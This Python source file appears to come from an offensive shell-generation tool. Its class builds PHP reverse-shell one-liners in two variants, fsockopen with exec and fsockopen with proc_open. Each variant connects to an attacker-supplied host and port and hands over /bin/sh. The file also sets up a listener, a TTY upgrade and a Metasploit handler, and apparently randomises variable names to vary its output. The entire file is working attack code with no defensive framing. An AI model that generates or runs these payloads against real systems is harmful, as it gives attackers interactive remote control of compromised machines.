import random
from .base import RandomNamePool, ShellGenerator, ShellOptions, ShellResult, TTY_UPGRADE, msf_handler, LISTENER_FMT, build_listener_setup

_VARIANTS = ["fsockopen", "proc_open"]


class PHPGenerator(ShellGenerator):
    language = "php"

    def _generate(self, opts: ShellOptions, names: RandomNamePool | None) -> ShellResult:
        variant = random.choice(_VARIANTS)
        if variant == "fsockopen":
            cmd = self._fsockopen(opts, names)
        else:
            cmd = self._proc_open(opts, names)

        return ShellResult(
            command=cmd, variant=variant, language=self.language, arch=opts.arch,
            listener=LISTENER_FMT.format(lport=opts.lport),
            tty_upgrade=TTY_UPGRADE,
            msf_compat=msf_handler("payload/cmd/unix/reverse_php", opts.lhost, opts.lport),
            listener_setup=build_listener_setup(opts.lhost, opts.lport),
        )

    def _fsockopen(self, opts: ShellOptions, names: RandomNamePool | None) -> str:
        sock = self._var("sock", names)
        return (
            f'php -r \'${sock}=fsockopen("{opts.lhost}",{opts.lport});'
            f'exec("/bin/sh -i <&3 >&3 2>&3");\''
        )

    def _proc_open(self, opts: ShellOptions, names: RandomNamePool | None) -> str:
        sock = self._var("sock", names)
        proc = self._var("proc", names)
        pipes = self._var("pipes", names)
        return (
            f'php -r \'${sock}=fsockopen("{opts.lhost}",{opts.lport});'
            f'${proc}=proc_open("/bin/sh",array(0=>${sock},1=>${sock},2=>${sock}),${pipes});\''
        )
